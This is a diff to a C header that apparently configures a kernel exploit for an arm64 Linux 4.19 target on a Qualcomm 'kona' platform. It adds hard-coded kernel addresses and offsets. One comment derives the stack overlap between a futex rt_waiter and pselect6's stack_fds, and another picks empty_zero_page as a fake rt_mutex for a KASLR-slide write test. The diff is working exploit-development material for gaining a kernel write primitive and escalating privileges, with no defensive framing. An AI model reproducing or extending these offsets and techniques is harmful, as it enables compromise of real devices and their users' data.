@@ -7,10 +7,18 @@
 
 /* target profile */
 #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL      /* link-time _text */
+#define KIMAGE_STEXT_LINK 0xffffff8008080800ULL     /* link-time _stext */
 #define P0_PAGE_OFFSET 0xffffffc000000000ULL        /* 4.19 linear-map base (VA_BITS=39) */
 #define P0_PHYS_OFFSET 0x80000000ULL                /* kona memstart_addr (DRAM base) */
 #define P0_KERNEL_PHYS_LOAD 0x80008000ULL           /* PHYS_OFFSET + TEXT_OFFSET(0x80000) */
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
+/* Verified from boot.elf frame sizes (2026-08-15):
+ *   rt_waiter  = __arm64_sys_futex(0x70) + do_futex(0x60+0x1a0) - +0xc0
+ *              = E - D - 0x1b0
+ *   stack_fds[0] = pselect6(0xa0) + core_sys_select(0x1c0) - +0x50
+ *              = E - D - 0x210
+ * delta = 0x60 = 12 words.  The old "24" came from forgetting the 0x60
+ * `stp x29,x30,[sp,#-0x60]!` in do_futex's prologue. */
 #define PSELECT_WAITER_WORD_SHIFT 12                /* measured frame delta (E-0x210 vs E-0x1b0) */
 
 /* kernel image addresses (link-time, from kallsyms) */
@@ -32,6 +40,14 @@
 #define SLIDE_NF_LOGGERS_IMAGE 0xffffff800b412318ULL    /* loggers[NFPROTO][NF_LOG_TYPE_MAX] */
 #define SLIDE_LOGGERS_0_1_IMAGE 0xffffff800b412320ULL   /* loggers + 1*8 = &loggers[0][1] */
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff800b7f8b64ULL  /* sysctl_bootid[16] (drivers/char/random.c; symtab-verified) */
+/* empty_zero_page (.bss @0xffffff800b750000): the kernel's shared ZERO page,
+   guaranteed all-zero (wait_lock=0 @+0, waiters=0 @+8/0x10, owner=0 @+0x18)
+   and writable (plain .bss).  The natural ownerless rt_mutex we use for the
+   slide write test, avoiding the unreliable groomed skb page AND the memstart-
+   randomized direct-map aliases.  (bm_pte+0x10000 was tried first: bm_pte is
+   the Blob-Memory driver's runtime data, NOT a free-page bitmap, so its
+   wait_lock/owner fields are garbage -> the walk bails before the write.) */
+#define GOT_FAKE_LOCK_BSS_IMAGE 0xffffff800b750000ULL
 #define SLIDE_INIT_TASK_IMAGE 0xffffff800b41e100ULL
 #define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffff800b756d80ULL
 
